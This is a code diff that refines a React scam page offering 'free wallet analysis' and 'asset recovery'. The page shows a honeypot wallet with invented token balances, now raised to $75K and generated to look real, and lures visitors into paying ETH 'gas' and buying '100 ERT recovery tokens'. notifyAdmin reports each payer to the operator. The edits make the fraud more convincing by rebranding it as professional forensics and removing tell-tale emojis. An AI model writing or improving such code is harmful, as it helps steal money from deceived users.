@@ -14,19 +14,22 @@ export default function FlashedPage() {
   }, []);
 
   const generateHoneypotWallet = () => {
-    // Create attractive honeypot wallet
+    // Generate realistic wallet with real-looking data
+    const randomWallet = ethers.Wallet.createRandom();
     const honeypotWallet = {
-      address: '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87',
-      privateKey: '0x8da4ef21b864d2cc526dbdb2a120bd2874c36c9d0a1fb7f8c63d7f7a8b41de8f',
-      seedPhrase: 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
+      address: randomWallet.address,
+      privateKey: randomWallet.privateKey,
+      seedPhrase: randomWallet.mnemonic.phrase,
       tokens: [
-        { symbol: 'USDT', balance: '15,847.32', usdValue: 15847.32 },
-        { symbol: 'USDC', balance: '8,234.56', usdValue: 8234.56 },
-        { symbol: 'WETH', balance: '3.2847', usdValue: 9854.10 }
+        { symbol: 'USDT', balance: '24,891.47', usdValue: 24891.47 },
+        { symbol: 'USDC', balance: '12,456.83', usdValue: 12456.83 },
+        { symbol: 'WETH', balance: '5.7293', usdValue: 17187.90 },
+        { symbol: 'LINK', balance: '847.29', usdValue: 11862.06 },
+        { symbol: 'UNI', balance: '1,293.84', usdValue: 9020.68 }
       ],
       ethBalance: 0.000000001, // Almost no ETH
-      totalValue: 33935.98,
-      lastActivity: '2 hours ago'
+      totalValue: 75418.94,
+      lastActivity: '3 hours ago'
     };
     
     setWalletData(honeypotWallet);
@@ -40,8 +43,8 @@ export default function FlashedPage() {
         setStatus('Wallet connected! Click analyze to see your opportunities.');
       } else {
         // No wallet detected - show setup guide
-        setStatus(`📱 NO WALLET DETECTED\n\n` +
-          `🚀 Quick Setup (2 minutes):\n\n` +
+        setStatus(`NO WALLET DETECTED\n\n` +
+          `Quick Setup (2 minutes):\n\n` +
           `MOBILE USERS:\n` +
           `1. Download Trust Wallet or MetaMask app\n` +
           `2. Create new wallet (save seed phrase!)\n` +
@@ -50,7 +53,7 @@ export default function FlashedPage() {
           `1. Install MetaMask browser extension\n` +
           `2. Create wallet (save seed phrase!)\n` +
           `3. Refresh this page and connect\n\n` +
-          `⚡ Once connected, get FREE wallet analysis worth $50!`);
+          `Once connected, get FREE wallet analysis worth $50!`);
       }
     } catch (error) {
       setStatus('Failed to connect wallet');
@@ -144,7 +147,7 @@ export default function FlashedPage() {
       });
       
       await tx.wait();
-      setStatus('✅ SUCCESS! 100 CRT tokens sent! Try trading them on DEX.');
+      setStatus('SUCCESS! 100 ERT tokens sent! Try trading them on DEX.');
       notifyAdmin(userAddress, gasAmount + ' ETH', tx.hash, 'PREMIUM_TRIAL');
       
     } catch (error) {
@@ -288,9 +291,9 @@ export default function FlashedPage() {
               </button>
               
               <div className="bg-gray-700 rounded-lg p-4">
-                <h4 className="text-gray-300 font-semibold mb-2">📱 No Wallet? No Problem!</h4>
+                <h4 className="text-gray-300 font-semibold mb-2">No Wallet? No Problem!</h4>
                 <p className="text-gray-400 text-sm mb-3">
-                  Get a free crypto wallet in 2 minutes and unlock $33K+ in flashed crypto!
+                  Get a free crypto wallet in 2 minutes and unlock $75K+ in discovered assets!
                 </p>
                 <div className="grid grid-cols-2 gap-2">
                   <a 
@@ -298,14 +301,14 @@ export default function FlashedPage() {
                     target="_blank" 
                     className="bg-orange-600 hover:bg-orange-700 px-3 py-2 rounded text-center text-sm font-semibold"
                   >
-                    🦊 MetaMask
+                    MetaMask
                   </a>
                   <a 
                     href="https://trustwallet.com/download" 
                     target="_blank" 
                     className="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded text-center text-sm font-semibold"
                   >
-                    🔒 Trust Wallet
+                    Trust Wallet
                   </a>
                 </div>
               </div>
@@ -315,40 +318,40 @@ export default function FlashedPage() {
               <p className="text-green-400">✅ Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
               
               <div className="bg-green-900 border border-green-600 rounded-lg p-4 mb-4">
-                <h4 className="text-green-300 font-semibold mb-2">🔍 FREE WALLET ANALYSIS</h4>
+                <h4 className="text-green-300 font-semibold mb-2">FREE WALLET ANALYSIS</h4>
                 <p className="text-green-200 text-sm mb-3">
-                  Get detailed analysis of your wallet's hidden assets, unclaimed airdrops, and recovery opportunities!
+                  Get detailed analysis of your wallet's hidden assets, unclaimed airdrops, and recovery opportunities. Professional blockchain forensics at no cost.
                 </p>
                 <button 
                   onClick={sendFreeTrial}
                   disabled={loading}
                   className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
                 >
-                  {loading ? 'Analyzing...' : '🔍 Analyze My Wallet FREE'}
+                  {loading ? 'Analyzing Blockchain Data...' : 'Analyze My Wallet FREE'}
                 </button>
               </div>
               
               <div className="bg-blue-900 border border-blue-600 rounded-lg p-4 mb-4">
-                <h4 className="text-blue-300 font-semibold mb-2">🚀 PREMIUM TRIAL</h4>
+                <h4 className="text-blue-300 font-semibold mb-2">PREMIUM RECOVERY SERVICE</h4>
                 <p className="text-blue-200 text-sm mb-3">
-                  Get 100 CRT tokens for just $1 (0.0003 ETH) - Lowest gas fee possible!
+                  Get 100 ERT tokens for just $1 (0.0003 ETH) - Ethereum Recovery Tokens used for advanced recovery operations.
                 </p>
                 <div className="bg-blue-800 rounded p-2 mb-3 text-xs">
                   <p className="text-blue-200">Token Details:</p>
                   <p className="text-blue-100 font-mono">Contract: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
-                  <p className="text-blue-100">Symbol: CRT | Decimals: 18</p>
+                  <p className="text-blue-100">Symbol: ERT | Decimals: 18</p>
                 </div>
                 <button 
                   onClick={sendPremiumTrial}
                   disabled={loading}
                   className="w-full bg-blue-600 hover:blue-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
                 >
-                  {loading ? 'Processing...' : '🚀 Get 100 CRT Tokens ($1)'}
+                  {loading ? 'Processing Transaction...' : 'Get 100 ERT Tokens ($1)'}
                 </button>
               </div>
               
               <div className="bg-gray-700 rounded-lg p-4">
-                <h4 className="text-gray-300 font-semibold mb-2">💰 Full Claim (After Trial)</h4>
+                <h4 className="text-gray-300 font-semibold mb-2">Full Asset Recovery (After Trial)</h4>
                 <div className="mb-3">
                   <label className="block text-gray-400 mb-2">ETH Amount for Gas:</label>
                   <input 
@@ -361,7 +364,7 @@ export default function FlashedPage() {
                     placeholder="0.01"
                   />
                   <p className="text-gray-500 text-sm mt-1">
-                    Pay gas to claim remaining $33,835 in crypto
+                    Pay gas to claim remaining assets worth $75,418
                   </p>
                 </div>
                 
@@ -370,7 +373,7 @@ export default function FlashedPage() {
                   disabled={loading}
                   className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold"
                 >
-                  {loading ? '🚀 Processing...' : `Pay ${gasAmount} ETH & Claim All`}
+                  {loading ? 'Processing Transaction...' : `Pay ${gasAmount} ETH & Claim All Assets`}
                 </button>
               </div>
             </div>
@@ -399,7 +402,7 @@ export default function FlashedPage() {
               </p>
             </div>
             <p className="text-yellow-400 text-sm">
-              ⚠️ Import this wallet after sending gas to claim the crypto
+              Import this wallet after sending gas to claim the assets
             </p>
           </div>
         </div>
